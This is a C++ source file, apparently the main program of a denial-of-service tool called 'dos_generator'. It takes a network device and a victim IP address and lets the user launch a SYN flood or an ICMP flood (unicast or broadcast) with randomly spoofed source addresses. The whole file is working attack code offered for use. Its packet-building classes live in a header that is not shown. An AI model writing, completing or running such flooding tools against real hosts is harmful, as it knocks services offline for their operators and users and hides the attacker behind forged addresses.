#include <iostream>
#include "dosgenerator.h"

using namespace std;

void usage()
{
    cout<<"Usage : dos_generator <dev> <victim IP> "<<endl;
    exit(1);
}
int main(int argc, char* argv[])
{
    //TODO : make glog class and remain logs.

    if(argc != 3) usage();


    cout<< "1. Syn Flooding Attack" <<endl;
    cout<< "2. ICMP Flooding Attack" <<endl;
    cout<<"Answer : ";
    int choice;
    cin >> choice;

    switch (choice) {
    case 1:
    {
        SynFlood synFlood;

        synFlood.raw_init();

        //set target ip to argv[2]
        synFlood.target_ip_=argv[2];
        //set sender ip random
        synFlood.sender_ip_.set_rand_ip();

        //set ip header
        synFlood.init_iph(synFlood.sender_ip_,synFlood.target_ip_,IPPROTO_TCP);
        synFlood.init_tcph(1234,80);

        cout<<"Send Syn Flooding Attack... " <<endl;
        synFlood.generate();
    }
        break;
    case 2:
    {
        IcmpFlood icmpFlood;


        icmpFlood.raw_init(IPPROTO_RAW);

        icmpFlood.target_ip_= argv[2];
        //set src ip to random temperary
        icmpFlood.sender_ip_.set_rand_ip();

        icmpFlood.init_iph(icmpFlood.sender_ip_,icmpFlood.target_ip_,IPPROTO_ICMP);
        icmpFlood.init_icmph();

        cout<<"1. Send as Unicast"<<endl;
        cout<<"2. Send as Broadcast"<<endl;
        cout<<"Answer : ";
        cin >> choice;



        if(choice ==1)
        {
            cout<<"Send ICMP Flooding Attack... " <<endl;

            icmpFlood.generate(ICMP_SEND_UNICAST);
        }
        else
        {
            char network_class;
            cout<<"Input Network Class [A, B, C] : ";
            cin >> network_class;
            cout<<endl;
            //if want to ICMP_SEND_BROADCAST must be set class.
            cout<<"Send ICMP Flooding Attack... " <<endl;
            icmpFlood.generate(ICMP_SEND_BROADCAST, network_class);
        }


    }
        break;
    default:
        usage();

    }

    return 0;
}
